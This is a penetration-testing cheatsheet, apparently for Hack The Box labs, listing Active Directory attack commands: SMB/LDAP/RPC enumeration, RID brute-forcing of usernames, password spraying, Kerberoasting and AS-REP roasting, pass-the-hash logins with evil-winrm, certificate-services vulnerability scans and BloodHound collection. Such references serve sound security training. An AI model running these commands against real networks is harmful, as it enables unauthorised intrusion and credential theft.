---
title: Active Directory
description: Active Directory cheatsheet
date: 1970-01-24
categories: [Cheatsheets]
tags: [cheatsheets,active-directory]
---

## SMB

- Enumerate
  - `netexec smb <rhost>`
  - `enum4linux-ng -A <rhost>`
- List Shares
  - `netexec smb <rhost> -u <user> -p <password> --shares`
  - `netexec smb <rhost> -u guest -p '' --shares`
  - `smbclient -N -L //<rhost>`
- Enumerate Files
  - `smbclient //<rhost>/<share> -N`
  - `smbclient //<rhost>/<share> -U <user> <password>`
  - `netexec smb -u <user> -p <password> -M spider_plus`
- User enumeration
  - `netexec smb <rhost> -u 'guest' -p '' --rid-brute`
  - `netexec smb <rhost> -u 'guest' -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users.txt`
  - `netexec smb <rhost> -u 'guest' -p '' --users`
- Password spraying
  - `netexec smb <rhost> -u users.txt -p '<password>'`
- Password policy
  - `netexec smb <rhost> -u <user> -p <password> --pass-pol`

## LDAP

```console
ldapsearch -x -H ldap://<rhost> -s base
ldapsearch -x -H ldap://<rhost> -b "dc=htb,dc=local"
ldapsearch -x -H ldap://<rhost> -b "dc=htb,dc=local" "(objectClass=person)"
ldapsearch -x -H ldap://<rhost> -b "dc=htb,dc=local" "(objectClass=person)" sAMAccountName | grep sAMAccountName | awk "{print $2}"

ldapdomaindump ldap://<rhost> -u '<domain>\<user>' -p '<password>'

netexec ldap <rhost> -u <user> -p <password> --users
```

## RPC

```console
rpcclient -U "" <rhost> -N
> enumdomusers
> enumdomgroups
> getdompwinfo
> netshareenum
> srvinfo
```

## Kerberos

```console
ntpdate <rhost>

kerbrute userenum --dc <rhost> -d <domain> users.txt
kerbrute passwordspray --dc <rhost> -d <domain> users.txt <password>

impacket/GetUserSPNs.py <domain>/<username>:<password> -request
impacket/GetNPUsers.py -dc-ip <rhost> -request 'htb.local/' -format hashcat
```

## WinRM

```console
evil-winrm -i <rhost> -u <user> -p <password>
evil-winrm -i <rhost> -u <user> -H <hash> 
```

## RDP

```console
xfreerdp /u:<username> /p:<password> /v:<rhost> +clipboard
xfreerdp /d:<domain> /u:<username> /p:<password> /v:<rhost>
```

## Certificate Services

```console
certipy find -u <user> -p <password> -dc-ip <rhost> -stdout
certipy find -u <user> -p <password> -dc-ip <rhost> -stdout -vulnerable
certipy auth -pfx <file>
```

## Lateral Movement

```console
bloodhound-python -c all -d <domain> -u <user> -p <password> -ns <ip>
docker-compose -f /opt/bloodhoundce/docker-compose.yml up -d
```
